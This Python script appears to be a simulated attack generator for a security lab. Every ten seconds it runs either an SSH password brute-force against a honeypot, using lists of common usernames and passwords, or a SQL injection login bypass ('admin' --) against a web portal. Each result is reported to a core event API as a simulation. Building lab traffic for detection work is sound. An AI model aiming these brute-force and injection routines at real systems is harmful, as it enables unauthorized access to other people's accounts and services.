import requests
import time
import schedule
import paramiko
import random
import socket
import os

# CONFIGURATION
CORE_HOST = os.getenv("CORE_HOST", "nebulax-core")
CORE_API_URL = f"http://{CORE_HOST}:8000/events/ingest"

# Targets
WEB_TARGET = os.getenv("WEB_TARGET", "http://nebulax-target-web:5000")
SSH_TARGET = os.getenv("SSH_TARGET", "nebulax-honeypot")
SSH_PORT = int(os.getenv("SSH_PORT", "2222"))

# Wordlists
USERS = ["admin", "root", "user", "guest", "support"]
PASSWORDS = [
    "123456", "password", "12345678", "admin", "password123", 
    "hunter2", "solarwinds123", "marketing2024", "satellite", "iloveyou"
]

def report_event(event_type, severity, details, target):
    event = {
        "event_meta": {
            "origin_module": "red.attack.engine",
            "event_type": event_type,
            "severity": severity,
            "classification": "SIMULATION"
        },
        "context": {
            "mitre_attack_id": "T1110 (Brute Force)",
            "related_asset_id": target
        },
        "payload": {
            "details": details
        }
    }
    try:
        requests.post(CORE_API_URL, json=event, timeout=2)
    except:
        pass

def attack_ssh():
    """
    Try to SSH into the Honeypot.
    This generates AUTH_FAILURE logs containing the password,
    which the Password Auditor will then Crack.
    """
    user = random.choice(USERS)
    password = random.choice(PASSWORDS)
    
    print(f" [*] SSH Attack: {user}:{password} @ {SSH_TARGET}")
    
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try:
        client.connect(
            SSH_TARGET, 
            port=SSH_PORT, 
            username=user, 
            password=password, 
            timeout=2,
            banner_timeout=2
        )
        # If we get here, we got in!
        print(f" [!] SSH SUCCESS: {user}:{password}")
        report_event("EXPLOIT_SUCCESS", "HIGH", f"SSH Login Success: {user}", "HONEYPOT-01")
        client.close()
    except Exception as e:
        # This is EXPECTED. We want to fail so the honeypot logs the failure.
        pass

def attack_web():
    """
    SQL Injection Attack against the Web Portal
    """
    payload = "admin' --"
    print(f" [*] Web Attack: SQLi on {WEB_TARGET}")
    try:
        resp = requests.post(f"{WEB_TARGET}/login", data={
            "username": payload, 
            "password": "random"
        }, timeout=2)
        
        if "WELCOME" in resp.text:
            report_event("EXPLOIT_SUCCESS", "HIGH", "SQL Injection Successful", "WEB-PORTAL-01")
            print(" [!] Web SQLi SUCCESS")
    except:
        pass

def run_campaign():
    # Randomly choose an attack vector to keep logs interesting
    if random.random() > 0.5:
        attack_ssh()
    else:
        attack_web()

# Run aggressively (every 10 seconds)
print(" [ Red Team ] Hybrid Attack Engine Online. Targeting SSH & Web...")
schedule.every(10).seconds.do(run_campaign)

while True:
    schedule.run_pending()
    time.sleep(1)